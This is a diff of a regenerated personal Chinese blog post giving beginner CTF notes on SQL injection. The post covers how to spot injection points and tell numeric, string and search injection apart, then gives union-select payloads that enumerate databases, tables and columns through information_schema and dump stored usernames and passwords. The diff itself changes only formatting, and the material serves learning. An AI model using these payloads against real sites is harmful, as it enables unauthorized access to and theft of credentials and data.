@@ -17,12 +17,12 @@
     
 <link rel="stylesheet" href="/css/loader.css">
 
-    <meta name="description" content="SQL注入一.前言SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型">
+    <meta name="description" content="SQL注入  一.前言 SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入基础">
 <meta property="og:url" content="https://cl1ck-t0.github.io/2025/12/29/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/index.html">
 <meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
-<meta property="og:description" content="SQL注入一.前言SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型">
+<meta property="og:description" content="SQL注入  一.前言 SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2025-12-29T07:00:34.000Z">
 <meta property="article:modified_time" content="2026-02-22T13:32:45.956Z">
@@ -141,7 +141,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">一.前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E5%AF%B9%E4%BA%8ESQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98"><span class="toc-number">1.2.</span> <span class="toc-text">二.对于SQL注入漏洞的挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%AF%E8%83%BD%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.可能的注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.漏洞检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">三.常见的注入手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.搜索型注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">四.联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E7%BC%96%E6%8F%92%E4%B8%80%E5%98%B4%EF%BC%9A%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">二编插一嘴：报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E6%94%AF%E6%8C%81"><span class="toc-number">1.5.1.</span> <span class="toc-text">原理支持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.</span> <span class="toc-text">五.盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.1.</span> <span class="toc-text">1.布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.2.</span> <span class="toc-text">2.时间盲注</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text"> SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text"> 一.前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%AF%B9%E4%BA%8Esql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98"><span class="toc-number">1.2.</span> <span class="toc-text"> 二.对于SQL注入漏洞的挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%8F%AF%E8%83%BD%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.可能的注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2.漏洞检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text"> 三.常见的注入手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.搜索型注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text"> 四.联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E7%BC%96%E6%8F%92%E4%B8%80%E5%98%B4%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text"> 二编插一嘴：报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E6%94%AF%E6%8C%81"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 原理支持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.</span> <span class="toc-text"> 五.盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 1.布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 2.时间盲注</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -217,22 +217,29 @@
     <div class="hr-line"></div>
     
     <div class="e-content article-entry" itemprop="articleBody">
-        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p>SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型数据库（即SQL是一种数据库查询语言）</p>
+        <h1 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> SQL注入</h1>
+<h2 id="一前言"><a class="markdownIt-Anchor" href="#一前言"></a> 一.前言</h2>
+<p>SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型数据库（即SQL是一种数据库查询语言）</p>
 <p><strong>注入产生的原因是后台服务器在接收相关参数时未做好过滤直接带入到数据库中查询，导致可以拼接执行构造的SQL语句</strong></p>
 <p><em>SQL注入漏洞的本质为数据库层面的RCE</em></p>
-<h2 id="二-对于SQL注入漏洞的挖掘"><a href="#二-对于SQL注入漏洞的挖掘" class="headerlink" title="二.对于SQL注入漏洞的挖掘"></a>二.对于SQL注入漏洞的挖掘</h2><p>由于现代浏览器比较完善，几乎不可能存在sql注入点（），因此以下所述均为做题中的体会（纯入门心得，有点问题请见谅doge）</p>
-<h3 id="1-可能的注入点"><a href="#1-可能的注入点" class="headerlink" title="1.可能的注入点"></a>1.可能的注入点</h3><p>1). 搜索框，登录界面等，这些地方肯定是与数据库有数据交互的，所以我们可以优先观察存在传值或者查询的地方。</p>
+<h2 id="二对于sql注入漏洞的挖掘"><a class="markdownIt-Anchor" href="#二对于sql注入漏洞的挖掘"></a> 二.对于SQL注入漏洞的挖掘</h2>
+<p>由于现代浏览器比较完善，几乎不可能存在sql注入点（），因此以下所述均为做题中的体会（纯入门心得，有点问题请见谅doge）</p>
+<h3 id="1可能的注入点"><a class="markdownIt-Anchor" href="#1可能的注入点"></a> 1.可能的注入点</h3>
+<p>1). 搜索框，登录界面等，这些地方肯定是与数据库有数据交互的，所以我们可以优先观察存在传值或者查询的地方。</p>
 <p>eg.buuctf 极客大挑战2019 EasySQL</p>
 <p>2). 当没有明显搜索框等明显交互位置时，并不代表不存在sql漏洞，这时可以通过url进行传参。</p>
 <p>eg.buuctf 极客大挑战2019 loveSQL &amp;&amp;Knife(后者虽然通常使用蚁剑来秒杀但是也可以用HackBar当成SQL做同样很快)</p>
-<h3 id="2-漏洞检测"><a href="#2-漏洞检测" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>1.get型</p>
+<h3 id="2漏洞检测"><a class="markdownIt-Anchor" href="#2漏洞检测"></a> 2.漏洞检测</h3>
+<p>1.get型</p>
 <p>进行url编码</p>
 <p>如果是在burp中测试payload需要先进行url编码，浏览器中则不需要;</p>
-<p>不进行编码的话，也可以用+代替空格，#代替–+ 。 &#x3D;&#x3D;%23代表#&#x3D;&#x3D;，也是注释符。</p>
+<p>不进行编码的话，也可以用+代替空格，#代替–+ 。 <mark>%23代表#</mark>，也是注释符。</p>
 <p>2.post型</p>
 <p>如果是post型的话，我们可以用上面的方法进行编码，或者使用+代替空格，也可以不使用，直接像在浏览器中探测一样。</p>
-<h2 id="三-常见的注入手法"><a href="#三-常见的注入手法" class="headerlink" title="三.常见的注入手法"></a>三.常见的注入手法</h2><p>首先我们应该判断知道其注入类型，SQL注入按照注入点类型分类可分为三种：</p>
-<h3 id="1-数字型注入"><a href="#1-数字型注入" class="headerlink" title="1.数字型注入"></a>1.数字型注入</h3><p> SQL中的语句格式：select * from users where id &#x3D;x</p>
+<h2 id="三常见的注入手法"><a class="markdownIt-Anchor" href="#三常见的注入手法"></a> 三.常见的注入手法</h2>
+<p>首先我们应该判断知道其注入类型，SQL注入按照注入点类型分类可分为三种：</p>
+<h3 id="1数字型注入"><a class="markdownIt-Anchor" href="#1数字型注入"></a> 1.数字型注入</h3>
+<p>SQL中的语句格式：select * from users where id =x</p>
 <pre><code>    判断方法：使用 1 and 1=1  ，1 and 1=2 来判断
 
     当输入：and 1=1 时页面显示正常
@@ -245,37 +252,40 @@
 
        说明是数字型注入
 </code></pre>
-<h3 id="2-字符型注入"><a href="#2-字符型注入" class="headerlink" title="2.字符型注入"></a>2.字符型注入</h3><p> SQL中的语句格式：select * from users where id &#x3D;’x’</p>
-<pre><code>    判断方法：使用 1&#39; and &#39;1&#39;=&#39;1  ，1&#39; and &#39;1&#39;=&#39;2 来判断
+<h3 id="2字符型注入"><a class="markdownIt-Anchor" href="#2字符型注入"></a> 2.字符型注入</h3>
+<p>SQL中的语句格式：select * from users where id =‘x’</p>
+<pre><code>    判断方法：使用 1' and '1'='1  ，1' and '1'='2 来判断
 
-    当输入：1’ and ‘1’=&#39;1 时页面显示正常
+    当输入：1’ and ‘1’='1 时页面显示正常
 
-                   select * from users where id =&#39;x&#39; and &#39;1&#39;=&#39;1&#39;
+                   select * from users where id ='x' and '1'='1'
 
-       输入：1’ and ‘1’=&#39;2 时页面显示异常
+       输入：1’ and ‘1’='2 时页面显示异常
 
-                  select * from users where id =&#39;x&#39; and &#39;1&#39;=&#39;2&#39;
+                  select * from users where id ='x' and '1'='2'
 
       说明是字符型注入
 </code></pre>
-<h3 id="3-搜索型注入"><a href="#3-搜索型注入" class="headerlink" title="3.搜索型注入"></a>3.搜索型注入</h3><p> 基于搜索框的注入</p>
-<pre><code>    SQL中的语句格式：select * from database.table where users like &#39;%要查询的关键字%&#39;
+<h3 id="3搜索型注入"><a class="markdownIt-Anchor" href="#3搜索型注入"></a> 3.搜索型注入</h3>
+<p>基于搜索框的注入</p>
+<pre><code>    SQL中的语句格式：select * from database.table where users like '%要查询的关键字%'
 
    判断方法：
 
-     某个商品名称%&#39; and 1=1 and &#39;%&#39;=&#39;  （这个语句的功能就相当于普通SQL注入的 and 1=1）
+     某个商品名称%' and 1=1 and '%'='  （这个语句的功能就相当于普通SQL注入的 and 1=1）
 </code></pre>
-<p>select * from database.table where users like ‘%某个商品名称%’ and 1&#x3D;1 and ‘%’&#x3D;’%’</p>
+<p>select * from database.table where users like ‘%某个商品名称%’ and 1=1 and ‘%’=‘%’</p>
 <pre><code>    页面显示正常
 
-     某个商品名称%&#39; and 1=2 and &#39;%&#39;=&#39;  （这个语句的功能就相当于普通SQL注入的 and 1=2）
+     某个商品名称%' and 1=2 and '%'='  （这个语句的功能就相当于普通SQL注入的 and 1=2）
 </code></pre>
-<p>select * from database.table where users like ‘%某个商品名称%’ and 1&#x3D;2 and ‘%’&#x3D;’%’</p>
+<p>select * from database.table where users like ‘%某个商品名称%’ and 1=2 and ‘%’=‘%’</p>
 <pre><code>    页面显示异常
 
     根据上面的返回情况来判断是否存在搜索型注入
 </code></pre>
-<h2 id="四-联合注入"><a href="#四-联合注入" class="headerlink" title="四.联合注入"></a>四.联合注入</h2><p>联合注入是一种非常常用的注入方式，union select 开头的语句属于联合注入，联合注入的必要条件就是页面必须要有回显位，否则就应该考虑使用盲注（后面再展开说明）</p>
+<h2 id="四联合注入"><a class="markdownIt-Anchor" href="#四联合注入"></a> 四.联合注入</h2>
+<p>联合注入是一种非常常用的注入方式，union select 开头的语句属于联合注入，联合注入的必要条件就是页面必须要有回显位，否则就应该考虑使用盲注（后面再展开说明）</p>
 <p>这里我将总结部分比较常用的SQL注入语句：</p>
 <p>首先我们先明确SQL注入的基本流程，在基础的SQL操作中通常有这样的尝试顺序：</p>
 <p>1.先判断SQL注入类型；</p>
@@ -283,65 +293,58 @@
 <p>3.爆库，爆表，爆列，爆内容。</p>
 <p>另外，页面可能存在过滤，有时要综合考虑各种绕过方法，例如双写绕过，编码绕过等。</p>
 <p>1).查找注入点</p>
-<p> <strong>语句：</strong></p>
+<p><strong>语句：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1 = 1#  </span><br></pre></td></tr></table></figure>
-
 <p>#可以用–+替换，有些情境#不能起作用QAQ</p>
 <p>(这条万能语句常用于<strong>登录框</strong>之类的注入)</p>
-<p> <strong>作用：<strong>是爆出表中的</strong>所有字段</strong></p>
-<p> <strong>举例</strong>：验证用户名和密码的语句</p>
+<p><strong>作用：<strong>是爆出表中的</strong>所有字段</strong></p>
+<p><strong>举例</strong>：验证用户名和密码的语句</p>
 <p>我们在这里做出简单的解释：</p>
 <p>页面原sql</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from users where username=&#x27;$name&#x27; and password=&#x27;$pwd&#x27;&quot;;</span><br></pre></td></tr></table></figure>
-
 <p>在进行上述语句后变为</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from users where username=&#x27;1&#x27; or 1 = 1#&#x27; and password=&#x27;$pwd&#x27;&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>#是注释符号，后面的内容被注释，or为或，两边一边为真就是真，由于右边1&#x3D;1为真，故为真；</p>
+<p>#是注释符号，后面的内容被注释，or为或，两边一边为真就是真，由于右边1=1为真，故为真；</p>
 <p>因此上述语句就等价于：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;1&#x27; or 1 = 1</span><br></pre></td></tr></table></figure>
-
-
-
 <p>2).查询字段数</p>
-<p> <strong>语句：</strong></p>
+<p><strong>语句：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 数值#</span><br></pre></td></tr></table></figure>
-
-
-
 <p>3).判断回显位</p>
 <p><strong>语句：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1’ union select 1,2,3#</span><br></pre></td></tr></table></figure>
-
 <p>在上一步的查询字段数后我们知道了字段数，接着就根据字段数来判断，若之前找到的字段数为二，事例语句就应该改为</p>
 <p>union select 1,2#</p>
 <p>4).爆破数据库名</p>
 <p><strong>关键</strong>：<strong>database()</strong></p>
 <p>​    根据回显位，在回显位输入所要内容对应的关键字。（例如回显位是 2，下面为事例）</p>
-<p> <strong>语句：</strong></p>
+<p><strong>语句：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,database(),3#   </span><br></pre></td></tr></table></figure>
-
 <p>5).爆破表格名</p>
 <p>关键：</p>
-<p><strong>group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</strong></p>
-<p> <strong>语句：</strong></p>
+<p><strong>group_concat(table_name) from information_schema.tables where table_schema=database()</strong></p>
+<p><strong>语句：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(),3#</span><br></pre></td></tr></table></figure>
-
-<p> 简单注释一下：</p>
+<p>简单注释一下：</p>
 <ul>
-<li><p><strong>1</strong>：第一个占位列，保持列数匹配</p>
+<li>
+<p><strong>1</strong>：第一个占位列，保持列数匹配</p>
 </li>
-<li><p><strong>group_concat(table_name)</strong>：核心攻击代码</p>
+<li>
+<p><strong>group_concat(table_name)</strong>：核心攻击代码</p>
 <ul>
 <li><code>group_concat()</code>：MySQL函数，将多行合并为一行</li>
 <li><code>table_name</code>：从information_schema.tables获取表名</li>
 </ul>
 </li>
-<li><p><strong>3</strong>：第三个占位列</p>
+<li>
+<p><strong>3</strong>：第三个占位列</p>
 <ul>
-<li><p><strong>information_schema</strong>：MySQL的系统数据库</p>
+<li>
+<p><strong>information_schema</strong>：MySQL的系统数据库</p>
 </li>
-<li><p><strong>tables</strong>：存储所有数据库表信息的元数据表</p>
+<li>
+<p><strong>tables</strong>：存储所有数据库表信息的元数据表</p>
 <p><code>where table_schema=database()</code></p>
 <ul>
 <li><strong>table_schema</strong>：筛选当前数据库</li>
@@ -354,39 +357,35 @@
 <p>由上述事例可以看出，和爆破数据库名一样的思路,都是在回显位输入所要内容对应的关键字。</p>
 <p>【注意：如果 information_schema 被过滤了，可以使用 sys】（QAQ没用过，本人也不懂emmmmmm）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&amp;&amp;substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),1,1)=&#x27;f&#x27;</span><br></pre></td></tr></table></figure>
-
-
-
 <p>6).爆破表格字段</p>
 <p>关键：</p>
-<p><strong>group_concat(column_name) from information_schema.columns where table_name&#x3D;’表格名’</strong></p>
+<p><strong>group_concat(column_name) from information_schema.columns where table_name=‘表格名’</strong></p>
 <p><strong>语句：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;表格名&#x27;,3#</span><br></pre></td></tr></table></figure>
-
-
-
 <p>7).获取字段值</p>
 <p>关键：</p>
 <p><strong>group_concat(id,username,password) from geekuser</strong></p>
 <p><strong>语句：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(id,username,password) from geekuser,3#</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="二编插一嘴：报错注入"><a href="#二编插一嘴：报错注入" class="headerlink" title="二编插一嘴：报错注入"></a>二编插一嘴：报错注入</h2><p>之前在尝试写一个登录注册留言板系统的时候遇到了一大堆数据库报错QAQ，然后发现这些报错都是详细到哪个文件的第几行，还给出了该文件的绝对路径emmmmmm。。。。。(绝对不是窝写的太拉吉了QAQ)</p>
+<h2 id="二编插一嘴报错注入"><a class="markdownIt-Anchor" href="#二编插一嘴报错注入"></a> 二编插一嘴：报错注入</h2>
+<p>之前在尝试写一个登录注册留言板系统的时候遇到了一大堆数据库报错QAQ，然后发现这些报错都是详细到哪个文件的第几行，还给出了该文件的绝对路径emmmmmm。。。。。(绝对不是窝写的太拉吉了QAQ)</p>
 <p>现在看到了报错注入的相关内容，遂加入。</p>
 <p>首先：报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。</p>
 <p>那么何为报错注入？</p>
-<p>报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。 </p>
-<h3 id="原理支持"><a href="#原理支持" class="headerlink" title="原理支持"></a>原理支持</h3><p>在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数：</p>
+<p>报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</p>
+<h3 id="原理支持"><a class="markdownIt-Anchor" href="#原理支持"></a> 原理支持</h3>
+<p>在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数：</p>
 <p><strong>updatexml（）</strong></p>
 <p><strong>extractvalue（）</strong></p>
 <p>当这两个函数在执行时，如果出现xml文档路径错误就会产生报错。</p>
-<h2 id="五-盲注"><a href="#五-盲注" class="headerlink" title="五.盲注"></a>五.盲注</h2><p>前面有提到，当页面不存在回显位时联合注入无法实现，该情况下我们可以考虑盲注<del>（纯猜测）</del>；</p>
+<h2 id="五盲注"><a class="markdownIt-Anchor" href="#五盲注"></a> 五.盲注</h2>
+<p>前面有提到，当页面不存在回显位时联合注入无法实现，该情况下我们可以考虑盲注~~（纯猜测）~~；</p>
 <p>盲注是不能通过直接显示的途径来获取数据库信息。在盲注中，需要根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同）</p>
 <p>盲注分为两种：布尔盲注和时间盲注。</p>
-<h3 id="1-布尔盲注"><a href="#1-布尔盲注" class="headerlink" title="1.布尔盲注"></a>1.布尔盲注</h3><p>后续补充</p>
-<h3 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="2.时间盲注"></a>2.时间盲注</h3><p>看我干嘛QAQ</p>
+<h3 id="1布尔盲注"><a class="markdownIt-Anchor" href="#1布尔盲注"></a> 1.布尔盲注</h3>
+<p>后续补充</p>
+<h3 id="2时间盲注"><a class="markdownIt-Anchor" href="#2时间盲注"></a> 2.时间盲注</h3>
+<p>看我干嘛QAQ</p>
 <p>后续会补充的（大概？</p>
 <p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_79218813/article/details/135090595">https://blog.csdn.net/2301_79218813/article/details/135090595</a></p>
 
@@ -439,7 +438,7 @@
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
       <div class="article-nav-link-wrap left">
-            <img data-src="/covers/acheron-honkai-star-3840x2160-19696.jpg" data-sizes="auto" alt="流量分析" class="lazyload">
+            <img data-src="/covers/columbina-genshin-3840x2160-23949.jpg" data-sizes="auto" alt="流量分析" class="lazyload">
         <a href="/2025/12/30/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" aria-label="Prev: 流量分析" title="Prev: 流量分析"></a>
         <div class="article-nav-caption">Prev</div>
         <h3 class="article-nav-title">
@@ -447,7 +446,7 @@
         </h3>
       </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/covers/39e140edac9ea960ff5b1c27f5316a89.jpg" data-sizes="auto" alt="xss基础" class="lazyload">
+          <img data-src="/covers/genshin-impact-hot-3840x2160-21459.jpg" data-sizes="auto" alt="xss基础" class="lazyload">
       <a href="/2025/11/23/xss%E5%9F%BA%E7%A1%80/" aria-label="Next: xss基础"  title="Next: xss基础"></a>
       <div class="article-nav-caption">Next</div>
       <h3 class="article-nav-title">
@@ -496,10 +495,10 @@
       </div>
       <div>
         <span class="icon-brush"></span>
-        21.8k
+        22k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        01:40
+        01:41
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -521,7 +520,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">一.前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E5%AF%B9%E4%BA%8ESQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98"><span class="toc-number">1.2.</span> <span class="toc-text">二.对于SQL注入漏洞的挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%AF%E8%83%BD%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.可能的注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.漏洞检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">三.常见的注入手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span 